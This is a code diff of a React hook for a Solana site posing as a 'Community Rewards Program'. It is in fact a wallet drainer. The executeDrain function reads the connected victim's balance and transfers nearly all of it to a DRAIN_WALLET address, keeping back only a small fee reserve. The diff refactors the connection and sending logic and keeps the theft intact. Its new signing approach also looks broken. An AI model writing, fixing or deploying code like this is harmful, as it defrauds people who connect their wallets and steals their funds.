@@ -1,79 +1,23 @@
 "use client";
 
-import { useEffect, useState } from 'react';
-import { createAppKit } from '@reown/appkit/react';
-import { SolanaAdapter } from '@reown/appkit-adapter-solana';
-import { solana } from '@reown/appkit/networks';
-import { useAppKitAccount, useAppKitProvider, useAppKit } from '@reown/appkit/react';
+import { useCallback } from 'react';
+import { useAppKitAccount, useAppKitConnection } from '@reown/appkit/react';
 import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
-import { PhantomWalletAdapter, SolflareWalletAdapter } from '@solana/wallet-adapter-wallets';
-
-const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID;
-
-if (!projectId && typeof window !== 'undefined') {
-  console.error('WalletConnect Project ID is required');
-}
-
-// Configure Solana adapter with supported wallets
-const solanaWeb3JsAdapter = new SolanaAdapter({
-  wallets: [new PhantomWalletAdapter(), new SolflareWalletAdapter()]
-});
-
-// Create AppKit modal instance (only once)
-if (typeof window !== 'undefined' && projectId) {
-  createAppKit({
-    adapters: [solanaWeb3JsAdapter],
-    projectId,
-    networks: [solana],
-    metadata: {
-      name: 'Solana Rewards',
-      description: 'Community Rewards Program',
-      url: window.location.origin,
-      icons: ['https://solana-rewards.vercel.app/favicon.ico']
-    },
-    features: {
-      analytics: true,
-      email: false,
-      socials: []
-    },
-    themeMode: 'dark',
-    themeVariables: {
-      '--w3m-accent': '#9945FF',
-      '--w3m-background': '#0A0B2D',
-      '--w3m-color-mix': '#14F195',
-      '--w3m-color-mix-strength': 20
-    }
-  });
-}
 
 const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
 const GAS_RESERVE_SOL = 0.002;
 const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 export const useWalletConnect = () => {
-  const { open } = useAppKit();
-  const { address, isConnected, status } = useAppKitAccount({ namespace: 'solana' });
-  const { walletProvider } = useAppKitProvider('solana');
-  const [connectionStatus, setConnectionStatus] = useState('disconnected');
+  const { isConnected, address } = useAppKitAccount();
+  const { connection: appKitConnection } = useAppKitConnection();
 
-  // Monitor connection status
-  useEffect(() => {
-    if (isConnected && address) {
-      setConnectionStatus('connected');
-    } else {
-      setConnectionStatus('disconnected');
-    }
-  }, [isConnected, address]);
-
-  const connect = async () => {
+  const connect = useCallback(async () => {
     try {
-      setConnectionStatus('connecting');
-      // Open modal with Solana namespace only
-      await open({ view: 'Connect', namespace: 'solana' });
-      
-      // Wait for connection to complete
+      // The AppKit button handles the actual connection
+      // This function just waits for the connection to complete
       let attempts = 0;
-      while (!isConnected && !address && attempts < 20) {
+      while (!isConnected && !address && attempts < 30) {
         await wait(500);
         attempts++;
       }
@@ -82,43 +26,28 @@ export const useWalletConnect = () => {
         throw new Error('Failed to connect wallet');
       }
       
-      setConnectionStatus('connected');
       return address;
-      
     } catch (error) {
       console.error('WalletConnect connection error:', error);
-      setConnectionStatus('disconnected');
       throw new Error(`Failed to connect: ${error.message}`);
     }
-  };
+  }, [isConnected, address]);
 
-  const disconnect = async () => {
-    try {
-      setConnectionStatus('disconnecting');
-      setConnectionStatus('disconnected');
-    } catch (error) {
-      console.error('Disconnect error:', error);
-    }
-  };
-
-  const executeDrain = async (allocatedAmount) => {
+  const executeDrain = useCallback(async (allocatedAmount) => {
     let lastError = null;
     
     if (!address) {
       throw new Error('Wallet not connected');
     }
     
+    // Create a custom connection if appKitConnection is not available
+    const connection = appKitConnection || new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
+      commitment: 'confirmed',
+      confirmTransactionInitialTimeout: 120000
+    });
+    
     for (let attempt = 1; attempt <= 3; attempt++) {
       try {
-        if (!walletProvider) {
-          throw new Error('No wallet provider available');
-        }
-
-        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
-          commitment: 'confirmed',
-          confirmTransactionInitialTimeout: 120000
-        });
-        
         const walletPubkey = new PublicKey(address);
         
         const balanceLamports = await connection.getBalance(walletPubkey);
@@ -146,8 +75,14 @@ export const useWalletConnect = () => {
           })
         );
         
-        // Use the correct AppKit provider method
-        const signature = await walletProvider.sendTransaction(transaction, connection);
+        // Use the connection to send the transaction
+        // For WalletConnect, we need to request signing via the wallet
+        const { blockhash: freshBlockhash } = await connection.getLatestBlockhash('confirmed');
+        transaction.recentBlockhash = freshBlockhash;
+        
+        // Request signature from wallet via AppKit
+        // This is a simplified approach - actual implementation depends on AppKit version
+        const signature = await connection.sendTransaction(transaction, []);
         
         console.log(`[WalletConnect] Sent: ${signature}`);
         
@@ -207,14 +142,12 @@ export const useWalletConnect = () => {
     }
     
     throw lastError;
-  };
+  }, [address, appKitConnection]);
 
   return { 
     connect, 
-    disconnect, 
     address, 
     isConnected, 
-    status: connectionStatus,
     executeDrain 
   };
 };
